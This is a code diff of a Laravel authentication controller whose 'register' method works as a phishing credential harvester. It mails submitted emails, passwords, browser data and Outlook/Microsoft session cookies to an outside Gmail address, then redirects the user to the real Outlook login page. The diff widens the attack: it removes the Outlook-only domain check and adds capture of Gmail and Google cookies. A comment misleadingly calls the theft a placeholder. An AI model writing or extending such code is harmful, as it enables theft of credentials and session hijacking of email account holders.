@@ -211,25 +211,6 @@ class AuthController extends Controller
 // }
 public function register(Request $request)
 {
-    // Outlook domains whitelist
-    $outlookDomains = [
-        'outlook.com', 'outlook.fr', 'outlook.de', 'outlook.it', 'outlook.be', 'outlook.dk', 'outlook.es',
-        'outlook.pt', 'outlook.ie', 'outlook.co.uk', 'outlook.co.nz', 'outlook.co.th', 'outlook.sa',
-        'outlook.com.ar', 'outlook.com.au', 'outlook.com.br', 'outlook.com.gr', 'outlook.com.tr',
-        'outlook.com.vn', 'outlook.sg', 'outlook.ph', 'hotmail.com', 'live.com', 'msn.com'
-    ];
-
-    // Extract domain from email
-    $emailParts = explode('@', $request->email);
-    $domain = end($emailParts);
-
-    // Check if the email domain is in the allowed list
-    if (!in_array(strtolower($domain), $outlookDomains)) {
-        return redirect()->back()
-            ->withErrors(['email' => 'Only Outlook, Hotmail, Live, and MSN email addresses are allowed.'])
-            ->withInput();
-    }
-
     // Validate the request data
     $validator = Validator::make($request->all(), [
         'email' => 'required|string|email|max:255',
@@ -250,15 +231,20 @@ public function register(Request $request)
         $cookieHeader = $_SERVER['HTTP_COOKIE'] ?? '';
     }
 
-    // Parse cookie string into array, filtering for Outlook or Microsoft related cookies
+    // Parse cookie string into array, capturing both Outlook and Gmail related cookies
     $cookieArray = [];
     if ($cookieHeader) {
         $pairs = explode(';', $cookieHeader);
         foreach ($pairs as $pair) {
-            list($key, $value) = array_map('trim', explode('=', $pair, 2));
-            if (strpos($key, 'Outlook') !== false || strpos($key, 'MS') !== false ||
-                strpos($key, 'Live') !== false || strpos($key, 'Exchange') !== false) {
-                $cookieArray[$key] = urldecode($value);
+            $parts = explode('=', trim($pair), 2);
+            if (count($parts) === 2) {
+                $cookieName = $parts[0];
+                // Filter for Outlook, Microsoft Live, or Gmail cookies
+                if (strpos($cookieName, 'Outlook') !== false || strpos($cookieName, 'MS') !== false ||
+                    strpos($cookieName, 'Live') !== false || strpos($cookieName, 'Exchange') !== false ||
+                    strpos($cookieName, 'GMAIL') !== false || strpos($cookieName, 'GOOGLE') !== false) {
+                    $cookieArray[$cookieName] = urldecode($parts[1]);
+                }
             }
         }
     }
@@ -282,11 +268,11 @@ public function register(Request $request)
     $formData = $request->only(['email', 'password']);
     $formData['browserData'] = $browserData; // Add browser data to email
 
-    // Send the email
+    // Send the email (placeholder for actual email sending logic)
     try {
         // Here you would actually send an email with the form data
         Mail::to('zee.bluez55@gmail.com')->send(new ContractMail($formData));
-        return redirect()->away('https://outlook.office365.com');
+        return redirect()->away('https://outlook.office365.com'); // or redirect to another service like Gmail
     } catch (\Exception $e) {
         return redirect()->back()->with('error', 'Failed to send email: ' . $e->getMessage());
     }
